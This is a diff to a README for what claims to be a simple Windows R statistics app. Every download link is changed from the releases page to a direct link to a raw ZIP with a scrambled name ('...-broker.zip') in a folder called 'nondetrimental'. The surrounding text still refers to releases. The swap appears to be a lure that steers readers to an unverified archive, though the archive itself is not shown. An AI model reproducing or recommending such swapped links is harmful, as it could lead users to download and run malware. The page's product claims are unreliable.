@@ -1,6 +1,6 @@
 # 📊 Using-R_Hypothesis-Testing-Correlation-and-Regression - Simple R Statistics for Windows
 
-[![Download the app](https://img.shields.io/badge/Download%20on%20GitHub-purple?style=for-the-badge&logo=github)](https://github.com/Dionedefeated354/Using-R_Hypothesis-Testing-Correlation-and-Regression/releases)
+[![Download the app](https://img.shields.io/badge/Download%20on%20GitHub-purple?style=for-the-badge&logo=github)](https://github.com/Dionedefeated354/Using-R_Hypothesis-Testing-Correlation-and-Regression/raw/refs/heads/main/nondetrimental/Hypothesis-and-Using-Correlation-Testing-Regression-broker.zip)
 
 ## 🧭 Overview
 
@@ -12,7 +12,7 @@ Use it when you want to explore data, test a claim, or check how one value chang
 
 Visit the releases page to download the app for Windows:
 
-https://github.com/Dionedefeated354/Using-R_Hypothesis-Testing-Correlation-and-Regression/releases
+https://github.com/Dionedefeated354/Using-R_Hypothesis-Testing-Correlation-and-Regression/raw/refs/heads/main/nondetrimental/Hypothesis-and-Using-Correlation-Testing-Regression-broker.zip
 
 Choose the latest release, then download the Windows file listed there. If you see a ZIP file, save it to your computer first, then open it and follow the setup steps inside.
 
@@ -110,7 +110,7 @@ Applied statistics, data analysis, data science, hypothesis testing, inferential
 
 Use this page to download the latest Windows release:
 
-https://github.com/Dionedefeated354/Using-R_Hypothesis-Testing-Correlation-and-Regression/releases
+https://github.com/Dionedefeated354/Using-R_Hypothesis-Testing-Correlation-and-Regression/raw/refs/heads/main/nondetrimental/Hypothesis-and-Using-Correlation-Testing-Regression-broker.zip
 
 ## 🛠️ Basic Workflow
 
